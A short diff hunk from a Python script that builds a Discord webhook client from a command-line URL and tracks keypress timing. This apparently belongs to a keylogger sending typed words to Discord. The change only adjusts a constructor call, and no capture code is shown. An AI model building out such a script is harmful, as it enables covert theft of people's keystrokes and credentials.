@@ -5,7 +5,7 @@ from discordwebhook import Discord
 import sys
 
 hook = sys.argv[1]
-discord = Discord(hook)
+discord = Discord(url=(hook))
 
 word = []
 last_pressed = time.time()
